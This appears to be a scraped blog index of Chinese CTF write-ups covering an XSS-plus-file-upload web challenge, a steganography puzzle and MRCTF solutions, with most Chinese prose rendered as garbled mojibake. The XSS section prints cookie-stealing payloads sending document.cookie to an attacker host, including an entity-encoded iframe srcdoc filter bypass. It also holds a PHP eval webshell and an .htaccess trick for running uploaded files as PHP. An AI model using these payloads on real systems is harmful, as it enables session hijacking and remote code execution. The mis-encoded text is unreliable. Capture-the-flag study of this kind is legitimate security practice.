çœ‹ä¸€çœ‹ï¼Œé¡ºä¾¿å·èµ°ä»–çš„ cookieã€‚ æˆåŠŸåœ¨ VPS ä¸Šæ¥æ”¶åˆ° cookieã€‚ PHPSESSID=9f767556e4ef66825cb9e3b399e5d243 è€Œåä¿®æ”¹ cookieï¼Œåˆ·æ–°é¡µé¢å°±æ˜¯ admin äº†ã€‚ Step 03 PHP æ–‡ä»¶ä¸Šä¼ ç»•è¿‡å†å›åˆ°å¼€å§‹çš„ /upload.phpï¼Œå‘ç°æ­¤æ—¶é¡µé¢ä¸Šç©ºç©ºå¦‚ä¹Ÿï¼Œç¡®å®æ˜¯ admin äº†ã€‚ æ²¡æœ‰å‰ç«¯ä¸Šä¼ ç•Œé¢ï¼Œé‚£ä¸‹é¢å°±ç›´æ¥å®¡è®¡ PHP æºç å†è‡ªå·±æ„é€ ä¸Šä¼ è¯·æ±‚å§ã€‚ &lt;?php require_once 'init.php'; error_reporting(0); if ($_SESSION['is_admin'] !== 1) { echo \"You are not admin! You can't access this page.\"; highlight_file(__FILE__); die(); } $userdir = \"uploads/\" . md5($_SERVER[\"REMOTE_ADDR\"]); if (!file_exists($userdir)) { mkdir($userdir, 0777, true); } if (isset($_POST[\"submit\"])) { $tmp_name = $_FILES[\"upload\"][\"tmp_name\"]; $name = basename($_FILES[\"upload\"][\"name\"]); if (!$tmp_name) { die(); } if (!$name) { die(\"filename cannot be empty!\"); } $extension = substr($name, strrpos($name, \".\") + 1); if (preg_match(\"/ph/i\", $extension)) { die(\"illegal suffix!\"); } $upload_file_path = $userdir . \"/\" . $name; if (!move_uploaded_file($tmp_name, $upload_file_path)) { die(\"Error!\"); } echo \"Your dir \" . $userdir . ' &lt;br&gt;'; echo \"Your file: \"; var_dump(scandir($userdir)); } å‚è€ƒ PHP æ‰‹å†Œï¼šPOST æ–¹æ³•ä¸Šä¼  strrpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œä¸”å¯¹å¤§å°å†™æ•æ„Ÿã€‚ äºæ˜¯ $extension å°±æ˜¯æ ¹æ®æ–‡ä»¶åä¸­æœ€åä¸€ä¸ª . ä¹‹åçš„å­—ç¬¦å¾—åˆ°æ–‡ä»¶çš„æ‰©å±•åï¼Œå¦‚æœåŒ…å« ph çš„è¯å°±ä¼šè¢«æ‹¦ä½äº†ã€‚ å¦å¤–ï¼Œè§¦å‘ä¸Šä¼ çš„è¯éœ€è¦ç”¨ POST æ–¹æ³•ï¼Œä¸”åŒ…å«ä¸€ä¸ª submit å˜é‡ï¼Œå€¼çš„è¯éšæ„è®¾ç½®å°±å¥½äº†ã€‚ å…ˆå‡†å¤‡ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œå­˜ä¸º miao.pngã€‚ &lt;?php @eval($_GET['miao']);?&gt; å½“ç„¶ POST ä¹Ÿè¡Œã€‚ Python å†™ä¸ªè„šæœ¬ä¸Šä¼ ã€‚ import requests url = \"http://45.76.221.54:8005/upload.php\" headers = { 'cookie': 'PHPSESSID=9f767556e4ef66825cb9e3b399e5d243' } form_data = { 'submit': (None, '1'), # 'upload': (f'.htaccess', open(f'.htaccess', 'rb')) 'upload': (f'miao.png', open(f'miao.png', 'rb')) } print(form_data) resp = requests.post(url, headers=headers, files=form_data, timeout=10) resp.encoding = 'utf-8' print(resp.content) ä¸Šä¼ ä¹‹åå‘ç°ä¸èƒ½æ‰§è¡Œ PHP è„šæœ¬ã€‚ åšçš„æ—¶å€™è¯•äº†è¯• %00 æˆªæ–­ test.php%00.pngã€1.php(0x00)/1.png ä¹‹ç±»çš„ï¼Œå‘ç°éƒ½ä¸è¡Œã€‚ å†å›å»çœ‹çœ‹é¢˜ç›®ç¯å¢ƒï¼ŒPHP 7.4.0 + Apache 2.4.38ã€‚ è€ƒè™‘åˆ°æœåŠ¡å™¨ç”¨äº† Apacheï¼Œå¯ä»¥è¯•è¯•ä¸Šä¼ ä¸€ä¸ª .htaccess æ–‡ä»¶ï¼Œè®©æ–‡ä»¶å¤¹é‡Œæ‰€æœ‰åç¼€çš„æ–‡ä»¶éƒ½äº¤ç»™ PHP æ¥å¤„ç†ã€‚ SetHandler application/x-httpd-php è¿™æ ·å°±èƒ½é€šè¿‡ä¸Šä¼ ä¸å¸¦æœ‰ ph åç¼€çš„æ–‡ä»¶æ¥æ‰§è¡Œ php ä»£ç äº†ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥åœ¨ .htaccess é‡Œè¿™ä¹ˆå†™ï¼Œä¹Ÿå°±æ˜¯ç»™ .png æ–‡ä»¶æŒ‡å®šç”¨ PHP æ¥å¤„ç†ã€‚ AddType application/x-httpd-php .png æ ¹æ®å¾—åˆ°çš„è·¯å¾„è¿›è¡Œè®¿é—®ï¼Œç„¶åç”¨ä¸€å¥è¯æœ¨é©¬å»æ‹¿ flagã€‚ æˆåŠŸæ‹¿åˆ° flagï¼Œå¥½è€¶ï¼ flag{851f398a-3db1-4299-8dd6-6a3d2467433f} æ‹“å±•ä¸€ä¸‹çœ‹çœ‹æºç é‚£é¡ºä¾¿å†æ¥çœ‹çœ‹ä»–æºç å¥½äº†ã€‚ å‘ç° post.php åœ¨æ¸²æŸ“é¡µé¢çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªè¿‡æ»¤ã€‚ å…·ä½“æ˜¯ function render_tags($str) { $str = preg_replace('/script|img|svg|on|document|window/i', \"\" ,$str); return $str; } é‚£å…¶å®è¿˜èƒ½ç›´æ¥ç”¨ iframe æ¥æ•´ï¼Œä¸è¿‡åŸç†å·®ä¸å¤šå€’æ˜¯äº†ã€‚ &lt;iframe src=javascript:alert('xss');&gt;&lt;/iframe&gt; æ”¹æ”¹è¿‡æ»¤æŠŠå…³é”®è¯æ›¿æ¢ä¸º hacker è¯•è¯•ï¼Œå³ function render_tags($str) { $str = preg_replace('/script|img|svg|on|document|window/i', \"hacker\" ,$str); return $str; } è¿™æ ·ä¸€ä¸‹å­éš¾åº¦å°±ä¸Šæ¥äº†ã€‚åŒ…å«è¿™äº›å…³é”®è¯çš„æ ‡ç­¾ä»¥åŠ onxxxx å±æ€§éƒ½ä¸èƒ½ç”¨äº†ã€‚ ï¼ˆå…¶å®è¿™é¢˜å‡ºé¢˜äººæœ€å¼€å§‹è¿‡æ»¤æ–¹æ³•å°±è¿™æ ·çš„ï¼Œåæ¥è§‰å¾—å¤ªéš¾äº†å°±æ”¹æˆæ›¿æ¢ä¸ºç©ºäº†ã€‚ ä½†æ˜¯è¿™æ ·è¿˜æœ‰ä¸ª iframe å¯ä»¥å†™å…¥ src å‘¢ã€‚ é¦–å…ˆæ„é€  payload &lt;script&gt;top.location.href='//VPSIP:PORT/'+document.cookie&lt;/script&gt; é…åˆ data åè®®ä»¥åŠ base64 ç¼–ç ï¼Œå†™å…¥åˆ° src é‡Œã€‚ &lt;iframe src=\"data:text/html;base64,PHNjcmlwdD50b3AubG9jYXRpb24uaHJlZj0nLy9WUFNJUDpQT1JULycrZG9jdW1lbnQuY29va2llPC9zY3JpcHQ+\"&gt;&lt;/iframe&gt; ç„¶è€Œæ‰“è¿‡å»å‘ç°è¢«æ‹¦ä½äº†â€¦â€¦ ä¹Ÿå°±æ˜¯è¯´ data é‡Œä¸èƒ½æ‹¿åˆ° document.cookieã€‚ å†æ¥çœ‹ iframe æ ‡ç­¾è¿˜æœ‰ä»€ä¹ˆç¥å¥‡çš„å±æ€§å‘¢ï¼Ÿ å‚è€ƒ HTML &lt;iframe&gt; æ ‡ç­¾çš„ srcdoc å±æ€§ ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ srcdoc å±æ€§ä¸­ç›´æ¥å†™å…¥ HTML æºç ã€‚ ä¸ºäº†é˜²æ­¢è¢«æ›¿æ¢æ‰ï¼Œè¿™é‡Œå¯ä»¥ç”¨ HTML entity ç¼–ç ä¸€ä¸‹ã€‚ &lt;iframe srcdoc=\"&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&amp;#116;&amp;#111;&amp;#112;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#61;&amp;#39;&amp;#47;&amp;#47;&amp;#86;&amp;#80;&amp;#83;&amp;#73;&amp;#80;&amp;#58;&amp;#80;&amp;#79;&amp;#82;&amp;#84;&amp;#47;&amp;#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;\"&gt;&lt;/iframe&gt; æ‰“è¿‡å»ï¼ŒæˆåŠŸæ”¶åˆ° cookieã€‚ å¥½è€¶ï¼ å°ç»“å¤ç°å®Œäº†è€¶ï¼ è¿™ç¯‡æ–‡ç« ä» NUAACTF 2021 Easy_XSS ä¸€é¢˜å…¥æ‰‹ï¼Œå¯¹æ•´ä¸ªè§£é¢˜è¿‡ç¨‹è¿›è¡Œäº†å¤ç°ã€‚ é¢˜ç›®è€ƒç‚¹ä¸»è¦åŒ…æ‹¬ XSS ç»•è¿‡ã€PHP ä»£ç å®¡è®¡ã€æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ï¼Œæ€»ä½“è€Œè¨€éš¾åº¦è¿˜å¥½ã€‚ åœ¨æ‹“å±•éƒ¨åˆ†ï¼Œå¯¹äºè¿‡æ»¤æ›¿æ¢ä¸ºå…¶ä»–å­—ç¬¦çš„æƒ…å†µè¿›è¡Œäº†åˆ†æï¼Œè¿›ä¸€æ­¥è€ƒè™‘äº† iframe æ ‡ç­¾ä¸­çš„ srcdoc å±æ€§åœ¨ XSS ä¸­çš„åˆ©ç”¨ã€‚ Extensive Reading.htaccessåˆ©ç”¨ä¸Bypassæ–¹å¼æ€»ç»“ æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆç»•è¿‡å§¿åŠ¿ï¼‰ XSSæ€»ç»“ ï¼ˆæºœäº†æºœäº†å–µ~","path":"2021/05/17/CTF_2021NUAACTF_EasyXSS/"},{"title":"CTF | 2021 è“å¸½æ¯ Misc å†¬å¥¥ä¼š_is_coming WriteUp","text":"å¼•è¨€ ç¬¬äº”å±Šè“å¸½æ¯å…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ› æ¯”èµ›æ—¶é—´: 2021-04-29 09:00 ~ 15:00 æ¯”èµ›å®˜ç½‘: https://bcs.qianxin.com/bluehatcup/index/index#/ äº”ä¸€ä¹‹å‰æ‰“äº†ä¸ªè“å¸½æ¯ï¼Œè¿™é‡Œå°±æ‘¸é±¼éšæ„å†™ä¸€é“ Misc é¢˜ç›®çš„ WriteUp å¥½äº†ã€‚ Miscå†¬å¥¥ä¼š_is_comingæ‹¼æ¥éšå†™ï¼Œåˆ†ç¦»å‡ºä¸€ä¸ª rarã€‚ å¤‡æ³¨æç¤ºå…«ä½æ•°ï¼Œè”ç³»é¢˜ç›®å†¬å¥¥ä¼šï¼Œåº”è¯¥æ˜¯ 2022 åŒ—äº¬å†¬å¥¥ä¼šå¼€å¹•çš„æ—¥å­å§ã€‚ ç”¨ MP3Stego è§£å¯†ã€‚ MP3StegoDecode.exe -X encode.mp3 -P 20220204 å¾—åˆ° \\xe2\\x9c\\x8c\\xef\\xb8\\x8e \\xe2\\x98\\x9d\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x98\\x9f\\xef\\xb8\\x8e\\xe2\\x97\\x86\\xef\\xb8\\x8e\\xe2\\x99\\x8c\\xef\\xb8\\x8e \\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x97\\xbb\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xe2\\x9d\\x8d\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x99\\x8e\\xef\\xb8\\x8e \\xf0\\x9f\\x93\\x82\\xef\\xb8\\x8e\\xe2\\x99\\x8d\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xf0\\x9f\\x8f\\xb1\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5 \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e \\xe2\\x9d\\x96\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x99\\x91\\xef\\xb8\\x8e\\xf0\\x9f\\x93\\xac\\xef\\xb8\\x8e \\xf0\\x9f\\x95\\x88\\xef\\xb8\\x8e\\xe2\\x99\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e \\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5\\xe2\\x99\\x8f\\xef\\xb8\\x8e \\xe2\\x99\\x8b\\xef\\xb8\\x8e \\xe2\\x97\\x8f\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5 \\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x9c\\x8d\\xef\\xb8\\x8e æ‹¿ python è§£ç ä¸€ä¸‹ã€‚ s=b'\\xe2\\x9c\\x8c\\xef\\xb8\\x8e \\xe2\\x98\\x9d\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x98\\x9f\\xef\\xb8\\x8e\\xe2\\x97\\x86\\xef\\xb8\\x8e\\xe2\\x99\\x8c\\xef\\xb8\\x8e \\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x97\\xbb\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xe2\\x9d\\x8d\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x99\\x8e\\xef\\xb8\\x8e \\xf0\\x9f\\x93\\x82\\xef\\xb8\\x8e\\xe2\\x99\\x8d\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xf0\\x9f\\x8f\\xb1\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5 \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e \\xe2\\x9d\\x96\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x99\\x91\\xef\\xb8\\x8e\\xf0\\x9f\\x93\\xac\\xef\\xb8\\x8e \\xf0\\x9f\\x95\\x88\\xef\\xb8\\x8e\\xe2\\x99\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e \\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5\\xe2\\x99\\x8f\\xef\\xb8\\x8e \\xe2\\x99\\x8b\\xef\\xb8\\x8e \\xe2\\x97\\x8f\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5 \\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x9c\\x8d\\xef\\xb8\\x8e' print(s.decode()) # âœŒï¸ â˜ï¸â™“ï¸â§«ï¸â˜Ÿï¸â—†ï¸â™Œï¸ â’ï¸â™ï¸â—»ï¸â–¡ï¸â¬§ï¸â™“ï¸â§«ï¸â–¡ï¸â’ï¸â“ï¸ â– ï¸â™‹ï¸âï¸â™ï¸â™ï¸ ğŸ“‚ï¸â™ï¸â™ï¸ğŸ±ï¸â™ï¸â™‹ï¸ğŸ™µ â™“ï¸â¬§ï¸ â–ï¸â™ï¸â’ï¸â“ï¸ â™“ï¸â– ï¸â§«ï¸â™ï¸â’ï¸â™ï¸â¬§ï¸â§«ï¸â™“ï¸â– ï¸â™‘ï¸ğŸ“¬ï¸ ğŸ•ˆï¸â™’ï¸â“ï¸ â– ï¸â–¡ï¸â§«ï¸ â§«ï¸â™‹ï¸ğŸ™µâ™ï¸ â™‹ï¸ â—ï¸â–¡ï¸â–¡ï¸ğŸ™µ â™‹ï¸â§«ï¸ â™“ï¸â§«ï¸âœï¸ WingDing ç¼–ç ï¼Œåœ¨ https://lingojam.com/WingDing è¿™é‡Œåœ¨çº¿è§£ç ä¸€ä¸‹ã€‚ Aï¸ Gï¸iï¸tï¸Hï¸uï¸bï¸ rï¸eï¸pï¸oï¸sï¸iï¸tï¸oï¸rï¸yï¸ nï¸aï¸mï¸eï¸dï¸ 1ï¸cï¸eï¸Pï¸eï¸aï¸k iï¸sï¸ vï¸eï¸rï¸yï¸ iï¸nï¸tï¸eï¸rï¸eï¸sï¸tï¸iï¸nï¸gï¸.ï¸ Wï¸hï¸yï¸ nï¸oï¸tï¸ tï¸aï¸keï¸ aï¸ lï¸oï¸oï¸k aï¸tï¸ iï¸tï¸?ï¸ WingDing ç¼–ç è¡¨ åœ¨ GitHub ä¸Šæ‰¾åˆ°äº† https://github.com/Tr0jAnV1rU4/1cePeak è¿™ä¸ªä»“åº“ã€‚ https://github.com/Tr0jAnV1rU4/1cePeak/blob/main/A/post-checkout åˆæƒ³åˆ°åœ¨ mp3 ç»“å°¾æœ‰ä¸ª cipher Hex è§£ç å‡ºæ¥æ˜¯ä¸€å † emoji è€ƒè™‘æ˜¯ emoji-aes åŠ å¯† https://aghorler.github.io/emoji-aes/ ï¼ˆæˆ–è€…ç”¨å’±è‡ªå·±æ­çš„ https://emoji-aes.miaotony.xyz/ ä¹Ÿè¡Œ ç”¨ How_6ad_c0uld_a_1cePeak_be? ä½œä¸º Key å»è§£å¯†ï¼Œæ‹¿åˆ° flagã€‚ flag{e32f619b-dbcd-49bd-9126-5d841aa01767} å°ç»“å–µï¼Œæ‘¸é±¼çœŸèˆ’æœã€‚ è½¬çœ¼ä¹‹é—´å°±åˆ°äº”æœˆä»½äº†å•Šã€‚ è¿™ä¸ªæœˆæœ‰ç‚¹å¿™ä¸èƒ½æ‘¸é±¼äº†ï¼Œå–µå‘œå‘œå‘œå‘œå‘œå‘œã€‚ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/05/09/CTF_2021BlueHat/"},{"title":"CTF | 2021 MRCTF WriteUp","text":"å¼•è¨€ 2021 MRCTF https://2021.mrctf.fun/ æ¯”èµ›æ—¶é—´ 2021-04-10 9ï¼š00 - 2021-4-11 21ï¼š00 æ¯”èµ›è§„åˆ™ å•äººè§£é¢˜èµ› å‰å‡ å¤©çœ‹åŒ—é‚® å¤©ç’‡Merak æˆ˜é˜Ÿæ•´äº†ä¸ªæ‹›æ–°èµ›ï¼Œå–µå–µä¹Ÿæ¥éšä¾¿ç©ç©å¥½äº†ï¼ ä»€ä¹ˆé¬¼æ‹›æ–°èµ›å˜›ï¼Œæ€ä¹ˆå·¨å¤§å¤š check in é¢˜ç›®ï¼Œç„¶è€Œå–µå–µå¹¶ä¸èƒ½ check inâ€¦â€¦ å–µå‘œï¼Œé¢˜ç›®è¿˜æ˜¯æ¯”è¾ƒé¡¶çš„ï¼Œå–µå–µç¡®å®ä¹Ÿä¸ä¼šåšä»€ä¹ˆï¼Œå¤§å“­ã€‚ REReal_CHECKINç›´æ¥ä¸¢è¿› IDA å‘ç°åªæœ‰ä¸€ä¸ª entryï¼Œçœ‹æ¥æ˜¯åŠ å£³äº†ã€‚ ä¸¢è¿› FUPX é‡Œä¸€çœ‹ï¼Œæœç„¶åŠ äº† UPX å£³ã€‚ è„±ä¸€ä¸‹å£³ï¼Œå†æ‰”è¿› IDAã€‚ tvjdvez7D0vSyZbnzv90mf9nuKnurL8YBZiXiseHFq== ç›´æ¥æ‹¿å» base64 è§£ç å‘ç°æ˜¯ä¹±ç ã€‚çœ‹æ¥æ˜¯é­”æ”¹çš„ base64 äº†ã€‚ å‘ç°ç¼–ç è¡¨é‡Œ å¤§å°å†™åè¿‡æ¥äº†â€¦â€¦è‰ï¼ äºæ˜¯å¤§å°å†™åè¿‡æ¥ï¼Œæ”¹ä¸€ä¸‹ç¼–ç è¡¨ï¼Œå†æ‹¿å» base64 è§£ç å°±èƒ½æ‹¿ flag äº†ã€‚ MRCTF{wElc0Me_t0_MRCTF_2o21!!!} Extensive Reading: çˆ†ç ´éé»˜è®¤Base64ç¼–ç è¡¨ Cryptofriendly_sign-in ez sign-in, just come and get the flag! nc node.mrctf.fun 10007 Mirrors: host, port = â€˜nairw.topâ€™, 4800 https://drive.buptmerak.cn/s/BTx9QNNskyKwnYH æºç  from Crypto.Util.number import * from hashlib import sha512 from random import choices from flag import flag import string Bits = 512 length = len(flag) * 8 def proof_of_work() -&gt; bool: alphabet = string.ascii_letters + string.digits head = \"\".join(choices(alphabet, k=8)) print(f'POW: SHA512(\"{head}\" + ?) starts with \"11111\"') tail = input().strip() message = (head + tail).encode() return sha512(message).hexdigest().startswith(\"11111\") def check_ans(_N, _x) -&gt; bool: check = 0 for i in range(len(_N)): check += _N[i] * _x[i] return check == 0 def main(): if not proof_of_work(): return print(\"Welcome to MRCTF2021, enjoy this friendly sign-in question~\") flag_bits = bin(bytes_to_long(flag.encode()))[2:] N = [getPrime(Bits) for _ in range(length)] print('N =', N) X = [] for i in range(length): x = [int(input().strip()) for _ in range(length)] if x in X: print('No cheat!') return if x.count(0) &gt; 0: print('No trivial!') return if not check_ans(N, x): print('Follow the rule!') return X.append(x) print('your gift:', flag_bits[i]) main() å…¶å®è¿™ä¸ªæ€è·¯å¾ˆç®€å•ï¼Œåªéœ€è¦ç”Ÿæˆ ä¸é‡å¤ æ¯ä¸ªæ•°éƒ½ä¸ä¸º0 å¯¹åº”ä½ç½®æ•°å­—çš„ä¹˜ç§¯ç´¯åŠ å’Œä¸º0 è¿™æ ·çš„åºåˆ—å°±å¯ä»¥äº†ã€‚ é‚£ä¹ˆæ€ä¹ˆç”Ÿæˆå‘¢ï¼Ÿ å…¶å®åªéœ€è¦ä»»æ„ (length/2) å¯¹æ•°å­—äº¤æ¢ä¸€ä¸‹ï¼Œæ­£è´Ÿå·äº¤æ›¿ä¸€ä¸‹ï¼Œå°±èƒ½å®ç°ä¹˜ç§¯ç´¯åŠ å’Œä¸º 0 äº†ã€‚ é‚£æ€ä¹ˆä¸é‡å¤å‘¢ï¼Ÿ å–µå–µæƒ³äº†æœ‰ä¸€æ®µæ—¶é—´ï¼Œåˆ°æœ€åä¸€æƒ³ï¼Œç›´æ¥éšæœºäº§ç”Ÿä¸‹æ ‡ï¼ŒæŠŠæ˜ å°„å…³ç³»å­˜ä¸€ä¸‹ï¼Œè¦æ˜¯å·²ç»å­˜åœ¨äº†å†²çªäº†å°±é‡æ–°äº§ç”Ÿå°±å®Œäº‹äº†å‘€ï¼ å¦å¤–æœ‰ä¸ªéº»çƒ¦çš„åœ°æ–¹å°±æ˜¯äº¤äº’å§ï¼Œè¾“å…¥ 224*224 ä¸ªæ•°å­—ï¼Œè·‘èµ·æ¥éƒ½æŒºä¹…çš„â€¦â€¦ Exp: from pwn import * from Crypto.Util.number import * from hashlib import sha512 from random import choices import string from tqdm import tqdm from pwnlib.util.iters import mbruteforce sh = remote('nairw.top', 4800) context.log_level = 'debug' def proof_of_work(sh): sh.recvuntil(\"SHA512(\\\"\") head = sh.recv(8) # .decode('utf-8') print(\"head:\", head) sh.recvuntil('with \\\"11111\\\"') for a in tqdm(range(0x30, 0x7f)): for b in range(0x30, 0x7f): for c in range(0x30, 0x7f): for d in range(0x30, 0x7f): rest = chr(a) + chr(b) + chr(c) + chr(d) m = (head.decode('utf-8') + rest).encode(\"utf-8\") if sha512(m).digest().hex().startswith(\"11111\"): print('\\nrest:', rest) sh.sendline(rest) # sh.recvuntil('again...God bless you get it...') return # proof = mbruteforce(lambda x: sha512((head + x).encode('utf-8')).hexdigest().startswith( # \"11111\"), string.ascii_letters + string.digits, length=4, method='fixed') # print('rest:', proof) # sh.sendline(proof) def generate_idx(length): \"\"\" éšæœºç”Ÿæˆå¯¹æ¢çš„ä¸‹æ ‡ dict \"\"\" idx_list = list(range(length)) idx_result = {} for _ in range(length//2): while True: r = choices(idx_list)[0] t = choices(idx_list)[0] if r != t: # print(r, t) # ä¸€åŠæ­£ ä¸€åŠè´Ÿ idx_result[r] = [t, 1] # æ­£è´Ÿå· idx_result[t] = [r, -1] idx_list.remove(r) idx_list.remove(t) break return idx_result def main(): proof_of_work(sh) sh.recvuntil(\"question~\") sh.recvuntil(\"N = \") tmp = sh.recvuntil(\"]\") tmp = tmp.decode('utf-8').strip() tmp = eval(tmp) print('====================') print(tmp) print(\"flag len:\", len(tmp) // 8) # 28 bits N = tmp length = len(N) print(length) idx_history = [] flag_bits = \"\" for i in range(length): idx = generate_idx(length) while idx in idx_history: idx = generate_idx(length) idx_history.append(idx) for j in range(length): try: t = N[idx[j][0]] * idx[j][1] except IndexError: print(idx, i, j) raise Exception payload = str(t) sh.sendline(payload) sh.recvuntil('your gift: ') x = sh.recv(1).decode('utf-8') print(f\"=======&gt; flag_{i+1}: {x}\") flag_bits += x with open('flag.txt', 'a', encoding='utf-8') as f: f.write(f\"{i+1}: {x} \") f.write(f\"{flag_bits}\\n\") print(flag_bits) # flag_bits = \"1001101010100100100001101010100010001100111101101100101010000000011001101111001010111110110001101101000001100110110001101101011010111110011000101101110010111110111000001110010001100000110001001101100001100110110110101111101\" flag_int = int(flag_bits, 2) flag = long_to_bytes(flag_int) print(\"=====&gt; flag:\", flag) if __name__ == '__main__': main() æœ€åå¾—åˆ°çš„ flag bits ä¸º 1001101010100100100001101010100010001100111101101100101010000000011001101111001010111110110001101101000001100110110001101101011010111110011000101101110010111110111000001110010001100000110001001101100001100110110110101111101 è½¬æ¢ä¸º bytes MRCTF{e@3y_ch3ck_1n_pr0bl3m} Webwwwafed_app I bought a WAF for my vulnerable app, and I think 